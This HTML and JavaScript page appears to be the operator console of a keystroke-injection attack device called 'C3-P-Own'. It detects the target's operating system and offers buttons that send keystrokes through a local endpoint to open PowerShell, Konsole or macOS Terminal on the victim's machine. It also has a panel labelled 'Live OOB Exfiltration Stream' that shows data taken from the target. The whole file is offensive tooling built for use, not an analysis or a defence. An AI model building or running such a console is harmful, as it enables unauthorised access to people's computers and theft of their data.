<!DOCTYPE html>
<html>
<head>
    <title>C3-P-Own Console</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <style>
        body { background: #0f0f14; color: #00ff66; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
        .container { max-width: 600px; margin: 0 auto; background: #14141f; padding: 20px; border: 1px solid #22332b; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        h2 { text-align: center; color: #fff; margin-top: 0; letter-spacing: 1px; border-bottom: 2px solid #00ff66; padding-bottom: 10px;}
        button { background: #1a2f23; color: #00ff66; border: 1px solid #00ff66; padding: 12px; font-family: monospace; font-size: 14px; font-weight: bold; margin: 8px 0; cursor: pointer; display: block; width: 100%; border-radius: 4px; transition: all 0.2s; }
        button:hover { background: #00ff66; color: #14141f; }
        .box { background: #07070a; border: 1px solid #1a2f23; height: 180px; padding: 10px; overflow-y: scroll; white-space: pre-wrap; margin-top: 10px; border-radius: 4px; color: #a9b7c6; font-size: 13px;}
        .os-menu { display: none; margin-top: 15px; }
        #os-banner { font-size: 15px; background: #1c1c28; padding: 12px; border-radius: 4px; border-left: 4px solid #ffcc00; color: #fff; margin-bottom: 15px; font-weight: bold;}
        h3 { margin: 10px 0 5px 0; color: #00e1ff; font-size: 16px;}
    </style>
</head>
<body>
    <div class="container">
        <h2>C3-P-Own Control Engine</h2>
        <div id="os-banner">HOST MONITOR: <span id="os-val" style="color:#ffcc00;">Detecting Target...</span></div>
        
        <div id="menu-WIN" class="os-menu">
            <h3>Target Platform: Windows Detected</h3>
            <button onclick="sendCmd('PRESS GUI')">1. Trigger Windows Menu</button>
            <button onclick="sendRaw('TYPE powershell.exe')">2. Inject PowerShell Call</button>
            <button onclick="sendCmd('PRESS ENTER')">3. Open Shell Console</button>
        </div>

        <div id="menu-LINUX" class="os-menu">
            <h3>Target Platform: Linux Detected</h3>
            <button onclick="sendCmd('PRESS GUI')">1. Trigger App Search</button>
            <button onclick="sendRaw('TYPE konsole')">2. Inject Terminal Call (KDE)</button>
            <button onclick="sendCmd('PRESS ENTER')">3. Open Shell Console</button>
        </div>

        <div id="menu-MAC" class="os-menu">
            <h3>Target Platform: macOS Detected</h3>
            <button onclick="sendRaw('DELAY')">1. Trigger Spotlight Hook</button>
            <button onclick="sendRaw('TYPE Terminal')">2. Inject Apple Terminal Call</button>
            <button onclick="sendCmd('PRESS ENTER')">3. Open Shell Console</button>
        </div>

        <h3>Live OOB Exfiltration Stream</h3>
        <div id="exfilBox" class="box">System listening...</div>
    </div>

    <script>
        function sendCmd(action) { fetch('/execute?val=' + encodeURIComponent(action)); }
        function sendRaw(str) { fetch('/execute?val=' + encodeURIComponent(str)); }
        
        void function syncConsole() {
            fetch('/status').then(r => r.json()).then(data => {
                document.getElementById('os-val').innerText = data.os;
                document.querySelectorAll('.os-menu').forEach(el => el.style.display = 'none');
                
                var activeMenu = document.getElementById('menu-' + data.os);
                if(activeMenu) {
                    activeMenu.style.display = 'block';
                    document.getElementById('os-banner').style.borderLeftColor = '#00ff66';
                }
                
                var box = document.getElementById('exfilBox');
                box.innerText = data.logs;
                box.scrollTop = box.scrollHeight;
            });
            setTimeout(syncConsole, 1000);
        }();
    </script>
</body>
</html>
